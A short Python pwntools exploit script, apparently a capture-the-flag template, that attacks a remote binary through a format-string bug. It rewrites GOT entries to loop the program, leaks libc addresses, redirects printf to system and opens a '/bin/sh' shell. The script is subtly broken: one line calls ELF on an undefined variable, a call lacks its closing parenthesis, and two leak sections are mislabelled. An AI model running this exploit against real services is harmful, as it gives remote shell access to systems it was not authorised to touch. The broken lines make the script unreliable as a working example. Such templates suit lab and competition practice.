from pwn import *
context.log_level='debug'

BINARY = "./binary"
URL = "domain.com"
PORT = 1337
WRITE_FMT_OFFSET = 6
BUF_OFFSET = 200
PROMPT = ""
MARKER = ""

elf = context.binary = ELF(BINARY)
rop = ROP(BINARY)
p = remote(URL, PORT)

### make program repeat ###
p.sendlineafter(PROMPT, flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got.exit:elf.symbols.main})
))

# alternate, abusing canary check
p.sendlineafter(PROMPT, flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got.__stack_chk_fail:elf.symbols.main}),
	"A"*(BUF_OFFSET+8) # idk if this works tbvh
))

### leak libc ###

# printf
p.sendlineafter(PROMPT, flat(
	f"%{WRITE_FMT_OFFSET+1}$sAAAA",
	elf.got.puts,
#	"A"*(BUF_OFFSET+8) #trigger canary
))
p.recvuntil(MARKER)
printf_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00"))
log.success("libc printf is: " + hex(printf_libc))

# puts
p.sendlineafter(PROMPT, flat(
	f"%{WRITE_FMT_OFFSET+1}$sAAAA",
	elf.got.printf,
#	"A"*(BUF_OFFSET+8)
))
p.recvuntil(MARKER)
puts_libc = u64(p.recvuntil('AAAA', drop=True).strip().ljust(8, b"\x00"))
log.success("libc puts is: " + hex(puts_libc))

# declare
LIBC = "./libc.so.6"

libc = ELF(libc)
libc.address = puts_libc - libc.symbols.puts
log.success("libc base is: "+hex(libc.address))

### system call to binsh ###
# only works because program has fmtstr vuln involving prints
p.sendlineafter(PROMPT, flat(
	fmtstr_payload(WRITE_FMT_OFFSET, {elf.got.printf:libc.symbols.system})
)
p.sendline("/bin/sh\x00")
p.interactive()
